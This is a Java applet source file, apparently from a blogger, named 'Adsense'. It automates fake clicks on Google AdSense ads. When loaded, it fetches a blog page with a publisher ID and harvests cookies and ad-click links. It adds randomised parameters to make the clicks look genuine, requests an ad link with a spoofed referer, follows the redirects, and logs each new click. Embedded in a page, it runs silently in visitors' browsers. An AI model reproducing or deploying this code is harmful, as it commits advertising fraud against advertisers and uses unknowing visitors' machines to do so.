/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * Personaliza aqui
 */
package newpackage;

/**
 *
 * @author JONATHAN
 */
import java.net.*;
import java.io.*;
import java.util.*;
import java.util.regex.*;
import java.applet.*;
import java.awt.TextArea;
import java.awt.Panel;
import java.awt.BorderLayout;

public class Adsense extends Applet{

    private Pattern pat = null;
    private Matcher mat = null;
    private String debugger = "";

    public String Peticion(String host, String cookie, String useragent, String referer) {
        String respuesta = "";
        try {
            URL pagina = new URL(host);
            URLConnection conn = pagina.openConnection();

            HttpURLConnection httpConn = (HttpURLConnection) conn;
            httpConn.setInstanceFollowRedirects(false);

            if (!useragent.equals("")) {
                httpConn.addRequestProperty("User-Agent", useragent);
            }
            if (!cookie.equals("")) {
                httpConn.addRequestProperty("Cookie", cookie);
            }
            if (!referer.equals("")) {
                httpConn.addRequestProperty("Referer", referer);
            }
            conn.connect();
            Map<String, List<String>> headers = conn.getHeaderFields();

            Iterator it = headers.entrySet().iterator();
            while (it.hasNext()) {
                Map.Entry e = (Map.Entry) it.next();
                respuesta += (e.getKey() + "=" + e.getValue() + "\n");
            }


            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));

            String entrada = "";

            while ((entrada = in.readLine()) != null) {
                respuesta += entrada;
            }
            in.close();

        }
        catch (IOException ex) {
            this.setDebug(ex.getMessage());
        }

        return respuesta;
    }

    public List<String> Search(String regex, String respuesta) {
        List<String> list = new ArrayList<String>();

        pat = Pattern.compile(regex);
        mat = pat.matcher(respuesta);

        while (mat.find()) {
            list.add(mat.group());
        }

        return list;
    }

    public void setDebug(String err) {
        debugger += err;
    }

    public static int aleatorio(int max, int min) {
        return (int) (Math.random() * (max - min)) + min;
    }

    public void init() {
        String host = "http://jonathan-palomino.blogspot.com/";
        String urlo = "http://jonathan-palomino.blogspot.com/2011/06/resultados-de-la-busqueda.html?cx=partner-pub-3343383823797305%3Adse90lsyk21&cof=FORID%3A10&ie=ISO-8859-1&q=sql&sa=Buscar#960";
        String debug = "0";
        String useragent = "pub-3343383823797305";
        Adsense adsense = new Adsense();

        if (getParameter("host") != null) {
            host = getParameter("host");
            adsense.setDebug("[+]Host de publicidad: " + host + ".\n");
        }

        if (getParameter("urlo") != null) {
            urlo = getParameter("urlo");
            adsense.setDebug("[+]URL del Adsense: " + urlo + ".\n");
        }

        if (getParameter("useragent") != null) {
            useragent = getParameter("useragent");
            adsense.setDebug("[+]UserAgent: " + useragent + ".\n");
        }
        if (getParameter("debug") != null) {
            debug = getParameter("debug");
        }

        setLayout(null);
        TextArea txaArea = new TextArea();
        txaArea.setBounds(0, 0, 500, 500);

        if (!urlo.equals("") && !host.equals("") && !useragent.equals("")) {
            String respuesta = "";
            List<String> search = new ArrayList<String>();
            String url = "";
            String comodin = "";
            String cookie = "";

            respuesta = adsense.Peticion(host, cookie, useragent, urlo);

            if (!respuesta.equals("")) {
                //adsense.setDebug(respuesta+"\n");

                search = adsense.Search("Set-Cookie=(.*)", respuesta);

                if (search.size() > 0) {
                    cookie = search.get(0).replaceAll("(\\[|Set-Cookie=|\\])", "");
                    //adsense.setDebug("[+]Cookie: " + cookie + "\n");
                }

                search = adsense.Search("href=\"[^\"]*\"", respuesta);

                if (search.size() > 0) {
                    Iterator iter = search.iterator();
                    while (iter.hasNext()) {
                        comodin = iter.next().toString();
                        if ((comodin.indexOf("/aclk") > -1) || (comodin.indexOf("/pagead/iclk") > -1) || (comodin.indexOf("/adsense/support/bin/request.py") > -1) || (comodin.indexOf("/pagead/ads") > -1)) {
                            if (comodin.indexOf("http://googleads.g.doubleclick.net") < 0 && comodin.indexOf("https://www.google.com") < 0) {
                                url += "http://googleads.g.doubleclick.net";
                            }
                            url += comodin.replaceAll("(\"|href=)", "") + "&nm=" + aleatorio(26, 4) + "&nh=1&clkt" + aleatorio(500, 29) + "&jca=" + aleatorio(8880, 2219) + "\n";
                        }
                    }

                    adsense.setDebug("[+]URLS PARA CLICKEAR: \n" + url);
                    String[] urls = url.split("\n");

                    /* CLICK */
                    respuesta = adsense.Peticion(urls[aleatorio(urls.length - 1, 0)], cookie, useragent, host);

                    if (!respuesta.equals("")) {
                        //adsense.setDebug(respuesta+"\n");

                        search = adsense.Search("Location=(.*)", respuesta);

                        while (search.size() > 0) {
                            url = search.get(0).replaceAll("(\\[|Location=|\\])", "");
                            //adsense.setDebug("[+]Location: " + url + "\n");


                            respuesta = adsense.Peticion(url, cookie, useragent, host);

                            //adsense.setDebug(respuesta+"\n");

                            search = adsense.Search("Location=(.*)", respuesta);
                        }
                        if (respuesta.indexOf("200 OK") > -1) {
                            adsense.setDebug("[+] 1 nuevo click para " + url + "\n");
                        }
                    }
                }
                else {
                    adsense.setDebug("[!] El tipo de anuncio no esta soportado (FLASH)\n");
                }
            }
            else {
                adsense.setDebug("[!] Error de conexión\n");
            }
        }
        else {
            adsense.setDebug("El HOST esta vacio.\n");
        }
        if (debug.equals("1")) {
            txaArea.setText(adsense.debugger);
            add(txaArea);
        }
        System.out.println(adsense.debugger);
    }
}
